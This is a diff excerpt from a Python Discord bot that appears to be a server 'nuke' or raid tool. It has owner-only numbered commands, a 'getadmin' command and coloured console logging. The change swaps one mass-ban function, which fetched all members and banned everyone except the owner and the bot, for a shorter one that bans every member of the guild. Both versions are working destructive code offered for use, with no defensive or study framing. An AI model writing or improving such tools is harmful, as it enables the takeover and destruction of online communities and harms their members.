@@ -268,29 +268,18 @@ async def getadmin(ctx):
     except Exception as e:
         print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error in admin command: {e}')
         
-       
 @bot.command(name="2")
 @is_owner()
-async def banall(ctx):
-    try:
-        await ctx.message.delete()
-        guild = ctx.guild
-
-        members = []
-        async for member in guild.fetch_members(limit=None):
-            members.append(member)
-
-        for member in members:
-            if member == guild.me or member == guild.owner or member.id == OWNER_ID:
-                continue
-
-            await guild.ban(member)
-            print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Banned member: {member.name}')
-
-        print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, "Banning process completed.")
-    except Exception as e:
-        print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error banning people in {guild.name}: {e}')
-
+async def massban(ctx):
+    for user in ctx.guild.members:
+        try:
+            await user.ban(reason="Mass ban")
+            print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f"Banned user: {user.name}")
+        except discord.Forbidden:
+            print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f"Missing Permissions to ban user: {user.name}")
+        except discord.HTTPException as e:
+            print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f"An error occurred while banning user {user.name}: {e}")
+            
 
 @bot.command()
 @is_owner()
